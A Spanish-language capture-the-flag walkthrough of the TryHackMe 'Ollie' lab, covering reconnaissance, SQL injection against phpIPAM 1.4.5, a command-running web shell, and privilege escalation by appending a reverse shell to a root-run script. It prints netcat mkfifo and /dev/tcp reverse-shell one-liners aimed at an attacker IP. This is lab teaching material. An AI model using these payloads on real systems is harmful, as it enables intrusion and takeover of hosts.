---
layout: single
title: Ollie - TryHackMe
excerpt: "Meet the world's most powerful hacker dog!"
date: 2022-04-19
classes: wide
header:
  teaser: /assets/images/thm-writeup-ollie/ollie_logo.png
  teaser_home_page: true
  icon: /assets/images/thm_ico.png
categories:
  - TryHackMe
  - infosec
tags:
  - CVE
  - Security
  - Ollie
  - Exploit

---
![logo](/assets/images/thm-writeup-ollie/ollie_logo.png)

 [Link](https://tryhackme.com/room/ollie "Ollie")

Ollie Unix Montgomery, the infamous hacker dog, is a great red teamer. As for development... not so much! Rumor has it, Ollie messed with a few of the files on the server to ensure backward compatibility. Take control before time runs out!!

## 1. Fase de reconocimiento

- Para  conocer a que nos estamos enfrentando lanzamos el siguiente comando:

~~~ go
└─$ ping -c 1 10.10.96.248
PING 10.10.96.248 (10.10.96.248) 56(84) bytes of data.
64 bytes from 10.10.96.248: icmp_seq=1 ttl=63 time=162 ms

--- 10.10.96.248 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 161.558/161.558/161.558/0.000 ms

~~~

- De acuerdo con el ***ttl=63***, sabemos que nos estamos enfrentando ante una máquina con sistema operativo linux.

- Whatweb, nos muestra la siguiente información:
  
~~~go
  └─$ whatweb 10.10.96.248
<http://10.10.96.248> [302 Found] Apache[2.4.41], Cookies[phpipamredirect], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], HttpOnly[phpipamredirect], IP[10.10.96.248], RedirectLocation[http://10.10.96.248/index.php?page=login]
<http://10.10.96.248/index.php?page=login> [200 OK] Apache[2.4.41], Bootstrap, Cookies[phpipam], Country[RESERVED][ZZ], Email[0day@ollieshouse.thm], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], HttpOnly[phpipam], IP[10.10.96.248], JQuery[3.5.1], PasswordField[ipampassword], Script[text/javascript], Title[Ollie :: login], X-UA-Compatible[IE=9,chrome=1], X-XSS-Protection[1; mode=block]

~~~

---

- URL: observamos la siguiente página:

![page](/assets/images/thm-writeup-ollie/ollie_page.png "ollie-page")

---

## 2. Enumeración / Escaneo

### 2.1 Nmap

- Escaneo de los 65536 puertos de red con nmap:
  
~~~go
└─# nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.96.248 -oN allports
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-19 20:32 -05
Initiating SYN Stealth Scan at 20:32
Scanning 10.10.96.248 [65535 ports]
Discovered open port 22/tcp on 10.10.96.248
Discovered open port 80/tcp on 10.10.96.248
Discovered open port 1337/tcp on 10.10.96.248
Completed SYN Stealth Scan at 20:33, 14.61s elapsed (65535 total ports)
Nmap scan report for 10.10.96.248
Host is up, received user-set (0.17s latency).
Scanned at 2022-04-19 20:32:52 -05 for 15s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
1337/tcp open  waste   syn-ack ttl 62

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.70 seconds
           Raw packets sent: 72151 (3.175MB) | Rcvd: 71568 (2.863MB)
~~~

- El anterior escaneo evidencia los siguientes puertos abiertos:

| Puerto  | Descripción |
| ---     | ---         |
| 22      | ssh         |
| 80      | htp         |
| 1337    | waste       |

- Escaneo en busca de vulnerabilidades sobre los puertos abiertos:

~~~go
└─# nmap -sCV -A -T4 -p22,80,1337 10.10.96.248                               
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-19 20:35 -05
Nmap scan report for 10.10.96.248 (10.10.96.248)
Host is up (0.16s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b7:1b:a8:f8:8c:8a:4a:53:55:c0:2e:89:01:f2:56:69 (RSA)
|   256 4e:27:43:b6:f4:54:f9:18:d0:38:da:cd:76:9b:85:48 (ECDSA)
|_  256 14:82:ca:bb:04:e5:01:83:9c:d6:54:e9:d1:fa:c4:82 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-title: Ollie :: login
|_Requested resource was http://10.10.96.248/index.php?page=login
| http-robots.txt: 2 disallowed entries 
|_/ /immaolllieeboyyy
|_http-server-header: Apache/2.4.41 (Ubuntu)
1337/tcp open  waste?
| fingerprint-strings: 
|   DNSStatusRequestTCP, GenericLines: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, 
|     It's been a while. What are you here for?
|   DNSVersionBindReqTCP: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, 
|     version
|     bind
|     It's been a while. What are you here for?
|   GetRequest: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, Get / http/1.0
|     It's been a while. What are you here for?
|   HTTPOptions: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, Options / http/1.0
|     It's been a while. What are you here for?
|   Help: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, Help
|     It's been a while. What are you here for?
|   NULL, RPCCheck: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name?
|   RTSPRequest: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, Options / rtsp/1.0
|_    It's been a while. What are you here for?
~~~

- De acuerdo con el anterior escaneo e observa que en el puerto ***1337*** se está ejecuntado algún tipo de script:
  
---

### 2.3 dirb

- Realizamos un escaneo de los directorios del dominio:

~~~go
─# dirb http://10.10.188.252               

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Apr 20 20:11:57 2022
URL_BASE: http://10.10.188.252/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.188.252/ ----
==> DIRECTORY: http://10.10.188.252/api/                                                              
==> DIRECTORY: http://10.10.188.252/app/                                                              
==> DIRECTORY: http://10.10.188.252/css/                                                              
==> DIRECTORY: http://10.10.188.252/db/                                                               
==> DIRECTORY: http://10.10.188.252/functions/                                                        
==> DIRECTORY: http://10.10.188.252/imgs/                                                             
+ http://10.10.188.252/index.php (CODE:302|SIZE:0)                                                    
==> DIRECTORY: http://10.10.188.252/install/                

~~~

- Realizando revisión de las rutas encontramos que la aplicación está gestionada por ***phpIPAM IP address management***

![page](/assets/images/thm-writeup-ollie/ollie_page.png "ollie-page3")

---

### 2.2 nc

- Nos conectamos utilizando ***nc*** y nos encontramos con el script en el cual y después de responder unas preguntas, nos entrega un usuario y su respectiva contraseña:
  
~~~go
└─# nc -nv 10.10.188.252 1337
(UNKNOWN) [10.10.188.252] 1337 (?) open
Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.

What is your name? test
What's up, Test! It's been a while. What are you here for? work
Ya' know what? Test. If you can answer a question about me, I might have something for you.


What breed of dog am I? I'll make it a multiple choice question to keep it easy: Bulldog, Husky, Duck or Wolf? Bulldog
You are correct! Let me confer with my trusted colleagues; Benny, Baxter and Connie...
Please hold on a minute
Ok, I'm back.
After a lengthy discussion, we've come to the conclusion that you are the right person for the job.Here are the credentials for our administration panel.

                    Username: ?????????

                    Password: O?????????

PS: Good luck and next time bring some treats!
~~~

- Con las credenciales obtenidas en el punto anterior procedemos a registrarnos en la página de ***login***, en el footer observamos que la versión de phpIPAM IP es v.1.4.5:

![page](/assets/images/thm-writeup-ollie/ollie_page3.png "ollie-page2")

- Realizando búsqueda de las vulnerabilidades asociadas encontré en está página: <https://sploitus.com/exploit?id=E7055726-504A-542F-8AA0-CBA281FCCF99> una refererecia a una prueba de concepto ls cual se encuentra en el siguiente link: <https://fluidattacks.com/advisories/mercury/>, prodecemos a ingresar en esté último y nos encontramos con las siguientes instrucciones:

![page](/assets/images/thm-writeup-ollie/ollie_page4.png "ollie-page4")

---

## 3 Explotación

- De acuerdo con las instricciones de la POC, procedemos con los siguientes pasos:
  
  - Go to settings and enable the routing module.
  - Go to show routing.
  - Click on "Add peer" and create a new "BGP peer".
  - Click on the newly created "BGP peer".
  - Click on "Actions" and go to "Subnet Mapping".
  - Scroll down to "Map new subnet".
  - Insert an SQL Injection sentence inside the search parameter, for example:

    ~~~go
    " union select @@version,2,user(),4 -- -. 
    ~~~

- Después de realizados estos pasos, observamos que la aplicación es vulnerable a sQL injection:

  ![page](/assets/images/thm-writeup-ollie/ollie_page5.png "ollie-page5")

### 3.1 Reverse shell

- Preparamos la revershell siguiendo las instrucciones de la web: <https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>:
<Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.
nc -e /bin/sh 10.0.0.1 1234
If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f>

~~~go
└─# curl http://10.10.188.252/shell.php\?cmd\=whoami
1	 www-data
 	3	4
~~~

- Preparamos la rshell y la codificamos en ***URL Encode*** en la página ***CyberChef***

~~~go
[Entrada]
curl http://10.10.18.17/shell.php\?cmd\=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.9.1.216 1337 >/tmp/f

[Salida]
curl http://10.10.18.17/shell.php\?cmd\=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.9.1.216%201337%20%3E%2Ftmp%2Ff
~~~


- Nos ponenos en escucha por el puerto 1337 desde la terminal 1 y desde otra terminal la 2 ejecutamos la reverse shell:
  
~~~go
[Terminal 1]
└─# nc -nlvp 1337                            
listening on [any] 1337 ...
connect to [10.9.1.216] from (UNKNOWN) [10.10.18.17] 49554
sh: 0: can't access tty; job control turned off
$ ls
INSTALL.txt
README.md
UPDATE
api
app
config.docker.php
config.php
~~~

~~~go
[Terminal 2]
╰─ curl http://10.10.18.17/shell.php\?cmd\=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.9.1.216%201337%20%3E%2Ftmp%2Ff

~~~

### 3.2 Bandera de usuario

- En este punto hemos logrado acceso como usuario www-data, pero nos podemos autenticar como ollie con la contraseña obtenida en el paso anterior y con este usario si podemos leer la bandera:

~~~go
www-data@hackerdog:/home/ollie$ cat user.txt
cat user.txt
cat: user.txt: Permission denied

ollie@hackerdog:/$ id
id
uid=1000(ollie) gid=1000(ollie) groups=1000(ollie),4(adm),24(cdrom),30(dip),46(plugdev)
ollie@hackerdog:/$ 
~~~

---

## 4 Bandera root

- Para obtener acceso como usuario root, procedemos a compartir pspy64 desde la siguiente url: <https://github.com/DominicBreuker/pspy> para listar los binarios que podemos llegar a manipular:

~~~go
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.9.1.216 - - [20/Apr/2022 22:47:58] "GET / HTTP/1.1" 200 -
~~~

~~~go
ollie@hackerdog:/tmp$ wget -d http://10.9.1.216/pspy64
wget -d http://10.9.1.216/pspy64
DEBUG output created by Wget 1.20.3 on linux-gnu.

Reading HSTS entries from /home/ollie/.wget-hsts
URI encoding = ‘UTF-8’
Converted file name 'pspy64' (UTF-8) -> 'pspy64' (UTF-8)
--2022-04-21 03:50:10--  http://10.9.1.216/pspy64
Connecting to 10.9.1.216:80... connected.
Created socket 3.
Releasing 0x0000562d91e4eea0 (new refcount 0).
Deleting unused 0x0000562d91e4eea0.

---request begin---
GET /pspy64 HTTP/1.1
User-Agent: Wget/1.20.3 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.9.1.216
Connection: Keep-Alive

---request end---
HTTP request sent, awaiting response... 
---response begin---
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.9.12
Date: Thu, 21 Apr 2022 03:50:10 GMT
Content-type: application/octet-stream
Content-Length: 3078592
Last-Modified: Thu, 21 Apr 2022 03:42:42 GMT

---response end---
200 OK
Registered socket 3 for persistent reuse.
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64              100%[===================>]   2.94M  1.44MB/s    in 2.0s    

2022-04-21 03:50:12 (1.44 MB/s) - ‘pspy64’ saved [3078592/3078592]

ollie@hackerdog:/tmp$ ls
ls
10.9.1.216  f  pspy64
~~~

- Procedemos a ejecutar el script y encontramos este binario  ***/bin/bash /usr/bin/feedme*** el cual podemos modificar:
  
~~~go
ollie@hackerdog:/tmp$ chmod +x pspy64
ollie@hackerdog:/tmp$ ./pspy64
./pspy64
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
2022/04/21 03:51:20 CMD: UID=0    PID=2392   | /bin/bash /usr/bin/feedme 
2022/04/21 03:51:20 CMD: UID=0    PID=2390   | 
2022/04/21 03:51:20 CMD: UID=0    PID=231    | 
~~~

- Con el siguiente código modificamos el binario para que se ejecute una reverse shell como root:
  
~~~go
ollie@hackerdog:/usr/bin$ echo "/bin/bash -i >& /dev/tcp/10.9.1.216/4444 0>&1" >> /usr/bin/feedme
~~~

- Como usario root podemos listar la bandera root:

~~~go
[id]
root@hackerdog:~# id
id
uid=0(root) gid=0(root) groups=0(root)
---
[root flag]
root@hackerdog:~# cat root.txt
cat root.txt
THM{?????????}
root@hackerdog:~# 
~~~

---

  Eso es todo!

  Fuentes:

  ¿Atascado con un cifrado o criptograma? Esta herramienta lo ayudará a identificar el tipo de cifrado, así como también le brindará información sobre herramientas posiblemente útiles para resolverlo.
  <https://www.boxentriq.com/code-breaking/cipher-identifier>

  GTFOBins es una lista seleccionada de archivos binarios de Unix que se pueden usar para eludir las restricciones de seguridad locales en sistemas mal configurados.
  <https://gtfobins.github.io/>#

  Cyberchef: herramienta en linea para descifrar.
  <https://gchq.github.io/CyberChef/>
